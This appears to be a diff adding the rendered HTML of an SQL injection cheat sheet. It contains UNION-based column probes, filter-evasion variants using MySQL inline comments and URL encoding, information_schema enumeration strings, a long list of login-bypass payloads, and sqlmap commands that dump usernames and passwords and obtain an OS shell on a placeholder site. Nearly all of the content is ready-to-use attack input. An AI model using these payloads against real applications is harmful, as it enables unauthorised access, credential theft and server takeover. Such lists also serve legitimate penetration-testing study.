+UNION ALL<span style="color:#f92672">(</span>SELECT 1,2<span style="color:#f92672">)</span>
+UNION ALL<span style="color:#f92672">(</span>SELECT 1,2,3<span style="color:#f92672">)</span>
+UNION ALL<span style="color:#f92672">(</span>SELECT 1,2,3,4<span style="color:#f92672">)</span>
+UNION ALL<span style="color:#f92672">(</span>SELECT 1,2,3,4,5<span style="color:#f92672">)</span>
+UNION ALL<span style="color:#f92672">(</span>SELECT 1,2,3,4,5,6<span style="color:#f92672">)</span>
+UNION ALL<span style="color:#f92672">(</span>SELECT 1,2,3,4,5,6,7<span style="color:#f92672">)</span>
+
+AND <span style="color:#ae81ff">1</span> UNION SELECT <span style="color:#ae81ff">1</span>
+AND <span style="color:#ae81ff">1</span> UNION SELECT 1,2
+AND <span style="color:#ae81ff">1</span> UNION SELECT 1,2,3
+AND <span style="color:#ae81ff">1</span> UNION SELECT 1,2,3,4
+AND <span style="color:#ae81ff">1</span> UNION SELECT 1,2,3,4,5
+AND <span style="color:#ae81ff">1</span> UNION SELECT 1,2,3,4,5,6
+AND <span style="color:#ae81ff">1</span> UNION SELECT 1,2,3,4,5,6,7
+NION DISTINCTROW SELECT <span style="color:#ae81ff">1</span>
+UNION DISTINCTROW SELECT 1,2
+UNION DISTINCTROW SELECT 1,2,3
+UNION DISTINCTROW SELECT 1,2,3,4
+UNION DISTINCTROW SELECT 1,2,3,4,5
+UNION DISTINCTROW SELECT 1,2,3,4,5,6
+</code></pre></div><h3 id="bypass-usando-comentarios">bypass usando comentarios</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/*!UNION*/ /*!SELECT*/ <span style="color:#ae81ff">1</span>
+/*!UNION*/ /*!SELECT*/ 1,2
+/*!UNION*/ /*!SELECT*/ 1,2,3
+/*!UNION*/ /*!SELECT*/ 1,2,3,4
+/*!UNION*/ /*!SELECT*/ 1,2,3,4,5
+/*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6
+/*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,7
+
+/*!12345UNION*/ /*!12345SELECT*/ <span style="color:#ae81ff">1</span>
+/*!12345UNION*/ /*!12345SELECT*/ 1,2
+/*!12345UNION*/ /*!12345SELECT*/ 1,2,3
+/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4
+/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5
+/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6
+/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6,7
+
+/*!12345UNION*/<span style="color:#f92672">(</span>/*!12345SELECT*/ 1<span style="color:#f92672">)</span>
+/*!12345UNION*/<span style="color:#f92672">(</span>/*!12345SELECT*/ 1,2<span style="color:#f92672">)</span>
+/*!12345UNION*/<span style="color:#f92672">(</span>/*!12345SELECT*/ 1,2,3<span style="color:#f92672">)</span>
+/*!12345UNION*/<span style="color:#f92672">(</span>/*!12345SELECT*/ 1,2,3,4<span style="color:#f92672">)</span>
+/*!12345UNION*/<span style="color:#f92672">(</span>/*!12345SELECT*/ 1,2,3,4,5<span style="color:#f92672">)</span>
+/*!12345UNION*/<span style="color:#f92672">(</span>/*!12345SELECT*/ 1,2,3,4,5,6<span style="color:#f92672">)</span>
+/*!12345UNION*/<span style="color:#f92672">(</span>/*!12345SELECT*/ 1,2,3,4,5,6,7<span style="color:#f92672">)</span>
+</code></pre></div><h3 id="bypass-usando-comentarios-and-url-encoding">bypass usando comentarios and url encoding</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/*!%55nion*/%20/*!%53elect*/1
+/*!%55nion*/%20/*!%53elect*/%201,2
+/*!%55nion*/%20/*!%53elect*/%201,2,3
+/*!%55nion*/%20/*!%53elect*/%201,2,3,4
+/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5
+/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6
+/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6,7
+
+/*!12345%55nion*/ /*!12345%53elect*/ <span style="color:#ae81ff">1</span>
+/*!12345%55nion*/ /*!12345%53elect*/ 1,2
+/*!1234%55nion*/ /*!12345%53elect*/ 1,2,3
+/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4
+/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5
+/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6
+/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6,7
+
+/*!12345%55nion*/<span style="color:#f92672">(</span>/*!12345%53elect*/ 1<span style="color:#f92672">)</span>
+/*!12345%55nion*/<span style="color:#f92672">(</span>/*!12345%53elect*/ 1,2<span style="color:#f92672">)</span>
+/*!12345%55nion*/<span style="color:#f92672">(</span>/*!12345%53elect*/ 1,2,3<span style="color:#f92672">)</span>
+/*!12345%55nion*/<span style="color:#f92672">(</span>/*!12345%53elect*/ 1,2,3,4<span style="color:#f92672">)</span>
+/*!12345%55nion*/<span style="color:#f92672">(</span>/*!12345%53elect*/ 1,2,3,4,5<span style="color:#f92672">)</span>
+/*!12345%55nion*/<span style="color:#f92672">(</span>/*!12345%53elect*/ 1,2,3,4,5,6<span style="color:#f92672">)</span>
+/*!12345%55nion*/<span style="color:#f92672">(</span>/*!12345%53elect*/ 1,2,3,4,5,6,7<span style="color:#f92672">)</span>
+</code></pre></div><h3 id="information_schematables-bypass">Information_schema.tables bypass</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/<span style="color:#f92672">=</span>schEMA<span style="color:#f92672">()</span>-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA<span style="color:#f92672">()</span>-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/<span style="color:#f92672">=</span>database<span style="color:#f92672">()</span>-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database<span style="color:#f92672">()</span>-- -
+/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/<span style="color:#f92672">=</span>hex table
+/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
+</code></pre></div><h3 id="concat">Concat</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">CoNcAt<span style="color:#f92672">()</span>
+concat<span style="color:#f92672">()</span> 
+CON%08CAT<span style="color:#f92672">()</span>
+CoNcAt<span style="color:#f92672">()</span>
+%0AcOnCat<span style="color:#f92672">()</span>
+/**//*!12345cOnCat*/
+/*!50000cOnCat*/<span style="color:#f92672">(</span>/*!*/<span style="color:#f92672">)</span>
+unhex<span style="color:#f92672">(</span>hex<span style="color:#f92672">(</span>concat<span style="color:#f92672">(</span>table_name<span style="color:#f92672">)))</span>
+unhex<span style="color:#f92672">(</span>hex<span style="color:#f92672">(</span>/*!12345concat*/<span style="color:#f92672">(</span>table_name<span style="color:#f92672">)))</span>
+unhex<span style="color:#f92672">(</span>hex<span style="color:#f92672">(</span>/*!50000concat*/<span style="color:#f92672">(</span>table_name<span style="color:#f92672">)))</span>
+</code></pre></div><h3 id="group_concat">group_concat</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/*!group_concat*/<span style="color:#f92672">()</span>
+gRoUp_cOnCAt<span style="color:#f92672">()</span>
+group_concat<span style="color:#f92672">(</span>/*!*/<span style="color:#f92672">)</span>
+group_concat<span style="color:#f92672">(</span>/*!12345table_name*/<span style="color:#f92672">)</span>
+group_concat<span style="color:#f92672">(</span>/*!50000table_name*/<span style="color:#f92672">)</span>
+/*!group_concat*/<span style="color:#f92672">(</span>/*!12345table_name*/<span style="color:#f92672">)</span>
+/*!group_concat*/<span style="color:#f92672">(</span>/*!50000table_name*/<span style="color:#f92672">)</span>
+/*!12345group_concat*/<span style="color:#f92672">(</span>/*!12345table_name*/<span style="color:#f92672">)</span>
+/*!50000group_concat*/<span style="color:#f92672">(</span>/*!50000table_name*/<span style="color:#f92672">)</span>
+/*!GrOuP_ConCaT*/<span style="color:#f92672">()</span>
+/*!12345GroUP_ConCat*/<span style="color:#f92672">()</span>
+/*!50000gRouP_cOnCaT*/<span style="color:#f92672">()</span>
+/*!50000Gr%6fuP_c%6fnCAT*/<span style="color:#f92672">()</span>
+</code></pre></div><h3 id="authen-bypass">Authen bypass</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#39;-&#39;</span>
+<span style="color:#e6db74">&#39; &#39;</span>
+<span style="color:#e6db74">&#39;&amp;&#39;</span>
+<span style="color:#e6db74">&#39;^&#39;</span>
+<span style="color:#e6db74">&#39;*&#39;</span>
+<span style="color:#e6db74">&#39; or &#39;&#39;-&#39;</span>
+<span style="color:#e6db74">&#39; or &#39;&#39; &#39;</span>
+<span style="color:#e6db74">&#39; or &#39;&#39;&amp;&#39;</span>
+<span style="color:#e6db74">&#39; or &#39;&#39;^&#39;</span>
+<span style="color:#e6db74">&#39; or &#39;&#39;*&#39;</span>
+<span style="color:#e6db74">&#34;-&#34;</span>
+<span style="color:#e6db74">&#34; &#34;</span>
+<span style="color:#e6db74">&#34;&amp;&#34;</span>
+<span style="color:#e6db74">&#34;^&#34;</span>
+<span style="color:#e6db74">&#34;*&#34;</span>
+<span style="color:#e6db74">&#34; or &#34;&#34;-&#34;</span>
+<span style="color:#e6db74">&#34; or &#34;&#34; &#34;</span>
+<span style="color:#e6db74">&#34; or &#34;&#34;&amp;&#34;</span>
+<span style="color:#e6db74">&#34; or &#34;&#34;^&#34;</span>
+<span style="color:#e6db74">&#34; or &#34;&#34;*&#34;</span>
+or true--
+<span style="color:#e6db74">&#34; or true--
+</span><span style="color:#e6db74">&#39; or true--
+</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> or true--
+<span style="color:#e6db74">&#39;) or true--
+</span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x
+</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">)=(</span><span style="color:#e6db74">&#39;x
+</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">))</span> or <span style="color:#f92672">((</span><span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">))=((</span><span style="color:#e6db74">&#39;x
+</span><span style="color:#e6db74">&#34; or &#34;x&#34;=&#34;x
+</span><span style="color:#e6db74">&#34;) or (&#34;x&#34;)=(&#34;x
+</span><span style="color:#e6db74">&#34;)) or ((&#34;x&#34;))=((&#34;x
+</span><span style="color:#e6db74">or 1=1
+</span><span style="color:#e6db74">or 1=1--
+</span><span style="color:#e6db74">or 1=1#
+</span><span style="color:#e6db74">or 1=1/*
+</span><span style="color:#e6db74">admin&#39;</span> --
+admin<span style="color:#e6db74">&#39; #
+</span><span style="color:#e6db74">admin&#39;</span>/*
+admin<span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+admin<span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;--
+</span><span style="color:#e6db74">admin&#39;</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">#</span>
+admin<span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;/*
+</span><span style="color:#e6db74">admin&#39;</span>or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> or <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">admin&#39;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+admin<span style="color:#e6db74">&#39; or 1=1--
+</span><span style="color:#e6db74">admin&#39;</span> or 1<span style="color:#f92672">=</span>1#
+admin<span style="color:#e6db74">&#39; or 1=1/*
+</span><span style="color:#e6db74">admin&#39;</span><span style="color:#f92672">)</span> or <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1
+</span><span style="color:#e6db74">admin&#39;</span><span style="color:#f92672">)</span> or <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>--
+admin<span style="color:#e6db74">&#39;) or (&#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;#
+</span><span style="color:#e6db74">admin&#39;</span><span style="color:#f92672">)</span> or <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>/*
+admin<span style="color:#e6db74">&#39;) or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+admin<span style="color:#e6db74">&#39;) or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;--
+</span><span style="color:#e6db74">admin&#39;</span><span style="color:#f92672">)</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">#</span>
+admin<span style="color:#e6db74">&#39;) or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;/*
+</span><span style="color:#e6db74">1234 &#39;</span> AND 1<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> UNION ALL SELECT <span style="color:#e6db74">&#39;admin&#39;</span>, <span style="color:#e6db74">&#39;81dc9bdb52d04dc20036dbd8313ed055
+</span><span style="color:#e6db74">admin&#34; --
+</span><span style="color:#e6db74">admin&#34; #
+</span><span style="color:#e6db74">admin&#34;/*
+</span><span style="color:#e6db74">admin&#34; or &#34;1&#34;=&#34;1
+</span><span style="color:#e6db74">admin&#34; or &#34;1&#34;=&#34;1&#34;--
+</span><span style="color:#e6db74">admin&#34; or &#34;1&#34;=&#34;1&#34;#
+</span><span style="color:#e6db74">admin&#34; or &#34;1&#34;=&#34;1&#34;/*
+</span><span style="color:#e6db74">admin&#34;or 1=1 or &#34;&#34;=&#34;
+</span><span style="color:#e6db74">admin&#34; or 1=1
+</span><span style="color:#e6db74">admin&#34; or 1=1--
+</span><span style="color:#e6db74">admin&#34; or 1=1#
+</span><span style="color:#e6db74">admin&#34; or 1=1/*
+</span><span style="color:#e6db74">admin&#34;) or (&#34;1&#34;=&#34;1
+</span><span style="color:#e6db74">admin&#34;) or (&#34;1&#34;=&#34;1&#34;--
+</span><span style="color:#e6db74">admin&#34;) or (&#34;1&#34;=&#34;1&#34;#
+</span><span style="color:#e6db74">admin&#34;) or (&#34;1&#34;=&#34;1&#34;/*
+</span><span style="color:#e6db74">admin&#34;) or &#34;1&#34;=&#34;1
+</span><span style="color:#e6db74">admin&#34;) or &#34;1&#34;=&#34;1&#34;--
+</span><span style="color:#e6db74">admin&#34;) or &#34;1&#34;=&#34;1&#34;#
+</span><span style="color:#e6db74">admin&#34;) or &#34;1&#34;=&#34;1&#34;/*
+</span><span style="color:#e6db74">1234 &#34; AND 1=0 UNION ALL SELECT &#34;admin&#34;, &#34;81dc9bdb52d04dc20036dbd8313ed055
+</span><span style="color:#e6db74">==
+</span><span style="color:#e6db74">=
+</span><span style="color:#e6db74">&#39;</span>
+<span style="color:#e6db74">&#39; --
+</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#</span>
+<span style="color:#e6db74">&#39; –
+</span><span style="color:#e6db74">&#39;</span>--
+<span style="color:#e6db74">&#39;/*
+</span><span style="color:#e6db74">&#39;</span><span style="color:#75715e">#</span>
+<span style="color:#e6db74">&#34; --
+</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#</span>
+<span style="color:#e6db74">&#34;/*
+</span><span style="color:#e6db74">&#39; and 1=&#39;1
+</span><span style="color:#e6db74">&#39; and a=&#39;a
+</span><span style="color:#e6db74"> or 1=1
+</span><span style="color:#e6db74"> or true
+</span><span style="color:#e6db74">&#39; or &#39;&#39;=&#39;
+</span><span style="color:#e6db74">&#34;</span> or <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">1′) and &#39;1′=&#39;1–
+</span><span style="color:#e6db74">&#39; AND 1=0 UNION ALL SELECT &#39;&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055
+</span><span style="color:#e6db74">&#34;</span> AND 1<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> UNION ALL SELECT <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;81dc9bdb52d04dc20036dbd8313ed055
+</span><span style="color:#e6db74"> and 1=1
+</span><span style="color:#e6db74"> and 1=1–
+</span><span style="color:#e6db74">&#39; and &#39;one&#39;=&#39;one
+</span><span style="color:#e6db74">&#39; and &#39;one&#39;=&#39;one–
+</span><span style="color:#e6db74">&#39; group by password having 1=1--
+</span><span style="color:#e6db74">&#39; group by userid having 1=1--
+</span><span style="color:#e6db74">&#39; group by username having 1=1--
+</span><span style="color:#e6db74"> like &#39;%&#39;
+</span><span style="color:#e6db74"> or 0=0 --
+</span><span style="color:#e6db74"> or 0=0 #
+</span><span style="color:#e6db74"> or 0=0 –
+</span><span style="color:#e6db74">&#39; or         0=0 #
+</span><span style="color:#e6db74">&#39; or 0=0 --
+</span><span style="color:#e6db74">&#39; or 0=0 #
+</span><span style="color:#e6db74">&#39; or 0=0 –
+</span><span style="color:#e6db74">&#34;</span> or 0<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> --
+<span style="color:#e6db74">&#34; or 0=0 #
+</span><span style="color:#e6db74">&#34;</span> or 0<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> –
+%<span style="color:#e6db74">&#39; or &#39;</span>0<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">0</span>
+ or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+ or 1<span style="color:#f92672">=</span>1--
+ or 1<span style="color:#f92672">=</span>1/*
+ or 1<span style="color:#f92672">=</span>1#
+ or 1<span style="color:#f92672">=</span>1–
+<span style="color:#e6db74">&#39; or 1=1--
+</span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1
+</span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>--
+<span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;/*
+</span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">#</span>
+<span style="color:#e6db74">&#39; or &#39;</span>1′<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1
+</span><span style="color:#e6db74">&#39;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+<span style="color:#e6db74">&#39; or 1=1 --
+</span><span style="color:#e6db74">&#39;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> –
+<span style="color:#e6db74">&#39; or 1=1--
+</span><span style="color:#e6db74">&#39;</span> or 1<span style="color:#f92672">=</span>1;<span style="color:#75715e">#</span>
+<span style="color:#e6db74">&#39; or 1=1/*
+</span><span style="color:#e6db74">&#39;</span> or 1<span style="color:#f92672">=</span>1#
+<span style="color:#e6db74">&#39; or 1=1–
+</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1
+</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1--
+</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>--
+<span style="color:#e6db74">&#39;) or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;/*
+</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">#</span>
+<span style="color:#e6db74">&#39;) or (&#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+<span style="color:#e6db74">&#39;) or (&#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1--
+<span style="color:#e6db74">&#39;) or (&#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;--
+</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>/*
+<span style="color:#e6db74">&#39;) or (&#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;#
+</span><span style="color:#e6db74">&#39;</span>or<span style="color:#e6db74">&#39;1=1
+</span><span style="color:#e6db74">&#39;</span>or<span style="color:#e6db74">&#39;1=1′
+</span><span style="color:#e6db74">&#34; or &#34;1&#34;=&#34;1
+</span><span style="color:#e6db74">&#34; or &#34;1&#34;=&#34;1&#34;--
+</span><span style="color:#e6db74">&#34; or &#34;1&#34;=&#34;1&#34;/*
+</span><span style="color:#e6db74">&#34; or &#34;1&#34;=&#34;1&#34;#
+</span><span style="color:#e6db74">&#34; or 1=1
+</span><span style="color:#e6db74">&#34; or 1=1 --
+</span><span style="color:#e6db74">&#34; or 1=1 –
+</span><span style="color:#e6db74">&#34; or 1=1--
+</span><span style="color:#e6db74">&#34; or 1=1/*
+</span><span style="color:#e6db74">&#34; or 1=1#
+</span><span style="color:#e6db74">&#34; or 1=1–
+</span><span style="color:#e6db74">&#34;) or &#34;1&#34;=&#34;1
+</span><span style="color:#e6db74">&#34;) or &#34;1&#34;=&#34;1&#34;--
+</span><span style="color:#e6db74">&#34;) or &#34;1&#34;=&#34;1&#34;/*
+</span><span style="color:#e6db74">&#34;) or &#34;1&#34;=&#34;1&#34;#
+</span><span style="color:#e6db74">&#34;) or (&#34;1&#34;=&#34;1
+</span><span style="color:#e6db74">&#34;) or (&#34;1&#34;=&#34;1&#34;--
+</span><span style="color:#e6db74">&#34;) or (&#34;1&#34;=&#34;1&#34;/*
+</span><span style="color:#e6db74">&#34;) or (&#34;1&#34;=&#34;1&#34;#
+</span><span style="color:#e6db74">) or &#39;</span>1′<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1–
+</span><span style="color:#e6db74">) or (&#39;</span>1′<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1–
+</span><span style="color:#e6db74">&#39;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> LIMIT 1;<span style="color:#75715e">#</span>
+<span style="color:#e6db74">&#39;or 1=1 or &#39;&#39;=&#39;</span>
+<span style="color:#e6db74">&#34;or 1=1 or &#34;&#34;=&#34;</span>
+<span style="color:#e6db74">&#39; or &#39;</span>a<span style="color:#e6db74">&#39;=&#39;</span>a
+<span style="color:#e6db74">&#39; or a=a--
+</span><span style="color:#e6db74">&#39;</span> or a<span style="color:#f92672">=</span>a–
+<span style="color:#e6db74">&#39;) or (&#39;</span>a<span style="color:#e6db74">&#39;=&#39;</span>a
+<span style="color:#e6db74">&#34; or &#34;</span>a<span style="color:#e6db74">&#34;=&#34;</span>a
+<span style="color:#e6db74">&#34;) or (&#34;</span>a<span style="color:#e6db74">&#34;=&#34;</span>a
+<span style="color:#e6db74">&#39;) or (&#39;</span>a<span style="color:#e6db74">&#39;=&#39;</span>a and hi<span style="color:#e6db74">&#34;) or (&#34;</span>a<span style="color:#e6db74">&#34;=&#34;</span>a
+<span style="color:#e6db74">&#39; or &#39;</span>one<span style="color:#e6db74">&#39;=&#39;</span>one
+<span style="color:#e6db74">&#39; or &#39;</span>one<span style="color:#e6db74">&#39;=&#39;</span>one–
+<span style="color:#e6db74">&#39; or uid like &#39;</span>%
+<span style="color:#e6db74">&#39; or uname like &#39;</span>%
+<span style="color:#e6db74">&#39; or userid like &#39;</span>%
+<span style="color:#e6db74">&#39; or user like &#39;</span>%
+<span style="color:#e6db74">&#39; or username like &#39;</span>%
+<span style="color:#e6db74">&#39; or &#39;</span>x<span style="color:#e6db74">&#39;=&#39;</span>x
+<span style="color:#e6db74">&#39;) or (&#39;</span>x<span style="color:#e6db74">&#39;=&#39;</span>x
+<span style="color:#e6db74">&#34; or &#34;</span>x<span style="color:#e6db74">&#34;=&#34;</span>x
+<span style="color:#e6db74">&#39; OR &#39;</span>x<span style="color:#e6db74">&#39;=&#39;</span>x<span style="color:#e6db74">&#39;#;
+</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>or<span style="color:#e6db74">&#39; and &#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>or<span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">&#39;</span> UNION ALL SELECT 1, @@version;<span style="color:#75715e">#</span>
+<span style="color:#e6db74">&#39; UNION ALL SELECT system_user(),user();#
+</span><span style="color:#e6db74">&#39;</span> UNION <span style="color:#66d9ef">select</span> table_schema,table_name FROM information_Schema.tables;<span style="color:#75715e">#</span>
+admin<span style="color:#e6db74">&#39; and substring(password/text(),1,1)=&#39;</span><span style="color:#ae81ff">7</span>
+<span style="color:#e6db74">&#39; and substring(password/text(),1,1)=&#39;</span><span style="color:#ae81ff">7</span>
+<span style="color:#e6db74">&#39; or 1=1 limit 1 -- -+
+</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;or&#39;
+</span></code></pre></div><h1 id="sqlmap">SQLMAP</h1>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> 
+<span style="color:#f92672">[</span>eazy scan<span style="color:#f92672">]</span>
+sqlmap -r request.txt 
+<span style="color:#f92672">[</span>eazy scan with request file<span style="color:#f92672">]</span>
+sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> --tor --tor-type<span style="color:#f92672">=</span>SOCKS5 
+<span style="color:#f92672">[</span>using tor<span style="color:#f92672">]</span>
+sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> --dbs 
+<span style="color:#f92672">[</span>list all database<span style="color:#f92672">]</span>
+sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> -D site_db --tables
+<span style="color:#f92672">[</span>list table in db site_db<span style="color:#f92672">]</span>
+sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> -D site_db -T users --columns
+<span style="color:#f92672">[</span>list collums<span style="color:#f92672">]</span>
+sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> -D site_db -T users -C username,password --dump
+<span style="color:#f92672">[</span>Dump only selected columns<span style="color:#f92672">]</span>
+sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> –method <span style="color:#e6db74">&#34;POST&#34;</span> –data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;submit=Submit&#34;</span> -D social_mccodes -T users –dump
+<span style="color:#f92672">[</span>Dump a table from a database when you have admin credentials<span style="color:#f92672">]</span>
+sqlmap --dbms<span style="color:#f92672">=</span>mysql -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> --os-shell
+<span style="color:#f92672">[</span>Get OS Shel<span style="color:#f92672">]</span>
+sqlmap --dbms<span style="color:#f92672">=</span>mysql -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> --sql-shell
+<span style="color:#f92672">[</span>Get SQL Shell<span style="color:#f92672">]</span>
+sqlmap -r login-chris.request --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --batch --string <span style="color:#e6db74">&#34;Wrong identification(query corect)&#34;</span>
+<span style="color:#f92672">[</span>best<span style="color:#f92672">]</span>
+</code></pre></div><h1 id="reference">Reference</h1>
